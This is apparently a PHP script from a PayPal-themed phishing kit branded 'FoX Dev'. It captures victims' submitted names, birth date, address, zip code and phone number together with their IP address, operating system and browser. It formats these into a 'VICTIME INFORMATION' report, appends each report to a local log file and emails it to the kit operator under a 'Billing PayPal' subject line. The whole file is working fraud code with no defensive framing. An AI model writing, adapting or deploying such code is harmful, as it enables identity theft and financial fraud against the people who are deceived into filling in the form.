<?php

session_start();


include("system.php");





$_SESSION['_Firstname_']     = $_POST['Firstname'];
$_SESSION['_LastName_']      = $_POST['LastName'];
$_SESSION['_birthdate_']     = $_POST['birthdate'];
$_SESSION['_addres_']        = $_POST['addres'];
$_SESSION['_City_']          = $_POST['City'];
$_SESSION['_State_']         = $_POST['State'];
$_SESSION['_zipCod_']        = $_POST['zipCod'];
$_SESSION['_phoneNumber_']   = $_POST['phoneNumber'];



$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ip = getenv("REMOTE_ADDR");


$marshall_email .= "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;border-style: solid;border-color: coral;width: 510px;background: url();background-repeat: no-repeat;background-position: center;'>
●•۰۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
±±±±±±±±±±[ <font style='color: #FF358B;'>BILLING INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🚩</font> COUNTRY = </font> <font style='color:#010101;'>".$_SESSION."</font><br>
<font style='color:#9c0000;'>🕘</font> DATE Rezult = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'>💌</font> Email = <font style='color:#0070ba;'>".$_SESSION['_email_']."</font><br>
<font style='color:#9c0000;'>👱‍</font> First Name = <font style='color:#0070ba;'>".$_SESSION['_Firstname_']."</font><br>
<font style='color:#9c0000;'>👨</font> Last Name = <font style='color:#0070ba;'>".$_SESSION['_LastName_']."</font><br>
<font style='color:#9c0000;'>🍼</font> Birth Date = </font> <font style='color:#010101;'>".$_SESSION['_birthdate_']."</font><br>
<font style='color:#9c0000;'>🏚</font> Address line = <font style='color:#0070ba;'>".$_SESSION['_addres_']."</font><br>
<font style='color:#9c0000;'>💒</font> City = <font style='color:#0070ba;'>".$_SESSION['_City_']."</font><br>
<font style='color:#9c0000;'>🏤</font> Province/State = <font style='color:#0070ba;'>".$_SESSION['_State_']."</font><br>
<font style='color:#9c0000;'>📫</font> Zip Code = <font style='color:#0070ba;'>".$_SESSION['_zipCod_']."</font><br>
<font style='color:#9c0000;'>📱</font> phone Number = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIME INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🗺</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>💻</font> SYS = <font style='color:#0070ba;'>".$OS."</font><br>
<font style='color:#9c0000;'>🌀</font> BROWSER = <font style='color:#0070ba;'>".$browserTy_Version."</font><br>
<font style='color:#9c0000;'>🍁</font> ADRESS IP = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
●•۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
</div></html>
\n";
include("sand_email.php");
$f = fopen("../../FoxDev.html", "a");
fwrite($f, $marshall_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " Billing PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']."] ";
$headers .= "From: ◙[•♥•FoX Dev 2•♥•]◙ <dev@fox.com>" . "\r\n";
mail($yourmail, $subject, $marshall_email , $headers);





?>